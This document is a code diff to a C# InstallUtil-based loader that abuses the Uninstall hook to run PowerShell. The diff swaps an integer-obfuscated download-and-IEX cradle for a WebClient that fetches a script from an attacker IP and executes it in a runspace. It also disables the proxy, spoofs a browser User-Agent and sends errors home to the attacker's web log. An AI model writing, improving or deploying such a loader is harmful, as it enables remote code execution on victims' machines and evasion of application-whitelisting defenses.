@@ -1,8 +1,7 @@
 using System;
-using System.Collections.Specialized;
+using System.Net;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
-using System.Xml.Linq;
 
 namespace InstallUtil
 {
@@ -18,6 +17,13 @@ namespace InstallUtil
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
+            // .NET HTTP hardening. Fixes "The underlying connection was closed:
+            // An unexpected error occurred on a receive." — allow TLS 1.2+ and stop
+            // sending the Expect: 100-continue probe that some proxies reset on.
+            ServicePointManager.SecurityProtocol =
+                SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+            ServicePointManager.Expect100Continue = false;
+
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
@@ -39,25 +45,30 @@ namespace InstallUtil
 
         private void Run(PowerShell ps, string resource)
         {
-            // "(New-Object System.Net.WebClient).DownloadString('"
-            string prefix = S(new int[]
-            {
-                40, 78, 101, 119, 45, 79, 98, 106, 101, 99, 116, 32, 83, 121, 115, 116, 101, 109, 46,
-                78, 101, 116, 46, 87, 101, 98, 67, 108, 105, 101, 110, 116, 41, 46, 68, 111, 119, 110,
-                108, 111, 97, 100, 83, 116, 114, 105, 110, 103, 40, 39
-            });
-
             // "http://192.168.45.177/"  <-- set your attacker IP
             string url = S(new int[]
             {
                 104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 56, 46, 52, 53, 46, 49, 55, 55, 47
             });
 
-            // "') | IEX"
-            string suffix = S(new int[] { 39, 41, 32, 124, 32, 73, 69, 88 });
+            // Download in C# (not PowerShell) so we control the HTTP stack — no system
+            // proxy, correct TLS. This is what avoids the WebClient receive failure.
+            string script;
+            try
+            {
+                using (WebClient wc = NewClient())
+                {
+                    script = wc.DownloadString(url + resource);
+                }
+            }
+            catch (Exception ex)
+            {
+                Report(url, resource, ex.ToString());
+                return;
+            }
 
-            string cmd = prefix + url + resource + suffix;
-            ps.AddScript(cmd);
+            // Run the downloaded script in the fresh runspace (IEX-equivalent).
+            ps.AddScript(script);
             var results = ps.Invoke();
             foreach (PSObject result in results)
             {
@@ -66,9 +77,40 @@ namespace InstallUtil
             // Surface PowerShell errors — otherwise failures are silent:
             foreach (var err in ps.Streams.Error)
             {
-                System.IO.File.AppendAllText(@"C:\hta_error.txt", resource + ": " + err.ToString() + Environment.NewLine);
+                Report(url, resource, err.ToString());
             }
             ps.Commands.Clear();
+        }
+
+        // Fresh WebClient with the system proxy disabled — the proxy is what resets the
+        // connection and throws "The underlying connection was closed".
+        private static WebClient NewClient()
+        {
+            WebClient wc = new WebClient();
+            wc.Proxy = null;
+            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+            return wc;
+        }
+
+        // Write the error locally AND phone it home so it shows up in the attacker's
+        // Apache access log (no need to RDP to read C:\hta_error.txt).
+        private static void Report(string url, string resource, string error)
+        {
+            try
+            {
+                System.IO.File.AppendAllText(@"C:\hta_error.txt",
+                    resource + ": " + error + Environment.NewLine);
+            }
+            catch { }
+
+            try
+            {
+                using (WebClient wc = NewClient())
+                {
+                    wc.DownloadString(url + "err?" + Uri.EscapeDataString(resource + ":" + error));
+                }
+            }
+            catch { }
         }
     }
 }
